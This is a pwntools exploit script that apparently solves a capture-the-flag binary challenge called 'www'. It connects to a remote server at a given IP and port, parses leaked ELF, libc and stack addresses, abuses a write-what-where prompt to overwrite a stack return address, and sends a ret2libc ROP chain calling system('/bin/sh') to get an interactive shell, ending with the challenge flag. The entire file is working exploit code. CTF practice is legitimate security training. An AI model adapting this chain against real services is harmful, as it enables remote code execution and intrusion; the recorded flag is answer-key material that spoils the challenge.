from pwn import *
elf = ELF('./www.patch', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

# note
'''
gdb :
b*main+131
b*main+178

aslr offset 
+0x1f2b8
+0x1f6e8
+0x1ff28
'''

while True:
    with context.local(log_level = 'error'):
        try:
            # p = elf.process()
            p = remote('139.59.234.75', 3005)

            # get address
            elf.address = eval('0x' + p.recvline_contains(b'www').decode().split('-')[0])
            libc.address = eval('0x' + p.recvline_contains(b'libc.so.6').decode().split('-')[0])
            stack_base = eval('0x' + p.recvline_contains(b'stack').decode().split('-')[0])

            # overwrite second sym.imp.__isoc99_scanf return address to main func
            stack_ret = stack_base+0x1f0d8
            p.sendlineafter(b'Where:', b'%d' % (stack_ret))
            p.sendlineafter(b'What:', b'%d' % (elf.address + 0x00001370))
            
            # break if not error
            recv = p.recvline()
            print()
            # print(f'\nfound at {p.pid}')
            break
        except:
            print('.', end='')
            pass

# show address
log.info(f'elf base @ 0x{elf.address:0x}')
log.info(f'libc base @ 0x{libc.address:0x}')
log.info(f'stack base @ 0x{stack_base:0x}')
log.info(f'stack return @ 0x{stack_ret:0x}')

# BoF stack
p.sendlineafter(b'Where:', b'%d' % (stack_ret))
p.sendlineafter(b'What:', b'%d' % (libc.sym['gets']))

# ret2libc
payload = b''.join([
    b'\x00'*1184,
    # 0x000000000002a3e5: pop rdi; ret;
    p64(libc.address + 0x000000000002a3e5),p64(next(libc.search(b'/bin/sh'))),
    p64(libc.sym['system'])

])
p.sendline(payload)
p.interactive()
# CJ2023{4a2973e00a74fe25e04b88c565813cf1}